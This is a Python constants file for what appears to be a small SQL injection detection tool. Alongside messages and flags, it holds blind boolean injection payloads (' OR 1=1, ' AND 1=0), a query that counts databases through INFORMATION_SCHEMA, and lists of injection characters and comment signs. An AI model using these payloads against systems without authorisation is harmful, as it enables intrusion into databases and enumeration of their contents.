# communication with user
SQLI_DETECTED_MSG = "SQLi may have been detected!\n"
SQLI_NOT_DETECTED_MSG = "SQLi not detected. \n"
SQLI_NO_COMMENT_SIGN_DETECTED = "Cannot find commenting option. \n"
BOOLEAN_BSQLI_ENABLED = "Boolean blind sqli is possible! \n"
BOOLEAN_BSQLI_DISABLED = "Boolean blind sqli is not possible. \n"

# chars and seperators
HEADER_SEP = ": "
AMPERSAND = "&"
EQUAL_SIGN = "="
APOSTROPHE = '\''

# strings and flags for the program
NOT_DETECTED = "no"
BOOLEAN_FALSE_RESPONSE_INDEX = 0
BOOLEAN_TRUE_RESPONSE_INDEX = 1

# constants
MAX_NUM_OF_DBS_TO_CHECK = 20

# sql queries
# Blind Boolean-based sql injection:
# check if option exists:
BLIND_BOOLEAN_ALWAYS_FALSE = "\' AND 1=0%s"
BLIND_BOOLEAN_ALWAYS_TRUE = "\' OR 1=1%s"
# check amount of dbs:
BLIND_BOOLEAN_COUNT_DBS = "\' or (SELECT COUNT(SCHEMA_NAME) FROM INFORMATION_SCHEMA.SCHEMATA ORDER BY SCHEMA_NAME) = %s%s"

# flags for operating the program
READ_REQUEST_FILE_FLAG = '-r'
PARAMETER_FLAG = "-p"

# lists of Strings
SQL_ERRORS = ["you have an error in your sql syntax"]
SQL_COMMENTS = [" -- ", "#"]
SQLI_CHARS = ["\'", "\0", "\\", "-", "%", "#"]
